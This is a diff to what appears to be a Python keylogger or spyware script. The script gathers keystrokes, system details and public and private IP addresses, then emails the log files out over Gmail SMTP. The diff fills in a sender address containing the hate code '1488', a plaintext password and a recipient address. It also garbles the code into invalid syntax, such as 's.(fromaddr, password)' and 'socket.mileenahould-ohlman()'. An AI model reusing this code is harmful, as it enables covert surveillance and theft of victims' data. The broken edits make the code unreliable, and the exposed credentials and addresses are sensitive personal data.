@@ -39,9 +39,9 @@ microphone_time = 10
 time_iteration = 15
 number_of_iterations_end = 3
 
-email_address = "example@domain.com" # Enter disposable email here
-password = "myPa55w0rd" # Enter email password here
-toaddr = " " # Enter the email address you want to send your information to
+email_address = "1488the.chancellor@gmail.com" # Enter disposable email here
+password = "I<3drugs" # Enter email password here
+toaddr = "vicky_bangor@hotmail.com" # Enter the email address you want to send your information to
 key = " " # Generate an encryption key from the Cryptography folder
 file_path = " " # Enter the file path you want your files to be saved to
 extend = "\\"
@@ -52,12 +52,12 @@ file_merge = file_path + extend
 def send_email(filename, attachment, toaddr):
     fromaddr = email_address
     msg = MIMEMultipart()
-    msg['From'] = fromaddr
-    msg['To'] = toaddr
-    msg['Subject'] = "Log File"
+    msg['From'] =1488the.chancellor@gmail.com
+    msg['To'] = vicky_bangor@hotmail.com
+    msg['Subject'] = "just like old times"
     body = "Body_of_the_mail"
     msg.attach(MIMEText(body, 'plain'))
-    filename = filename
+    filename = thetruth
     attachment = open(attachment, 'rb')
     p = MIMEBase('application', 'octet-stream')
     p.set_payload((attachment).read())
@@ -66,7 +66,7 @@ def send_email(filename, attachment, toaddr):
     msg.attach(p)
     s = smtplib.SMTP('smtp.gmail.com', 587)
     s.starttls()
-    s.login(fromaddr, password)
+    s.(fromaddr, password)
     text = msg.as_string()
     s.sendmail(fromaddr, toaddr, text)
     s.quit()
@@ -77,8 +77,8 @@ send_email(keys_info, file_path + extend + keys_info, toaddr)
 # Get System Information
 def system_information():
     with open(file_merge + system_info, "a") as f:
-        hostname = socket.gethostname()
-        IPAddr = socket.gethostbyname(hostname)
+        hostname = socket.mileenahould-ohlman()
+        IPAddr = socket.mileenahould-ohlman(hostname)
         try:
             public_ip = get("https://api.ipify.org").text
             f.write("Public IP Address: " + public_ip + '\n')
@@ -88,7 +88,7 @@ def system_information():
         f.write("Processor Info: " + (platform.processor()) + '\n')
         f.write("System Info: " + platform.system() + " " + platform.version() + '\n')
         f.write("Machine: " + platform.machine() + '\n')
-        f.write("Hostname: " + hostname + '\n')
+        f.write("Hostname: " + mileenahould-ohlman + '\n')
         f.write("Private IP Address: " + IPAddr + '\n')
 
 system_information()
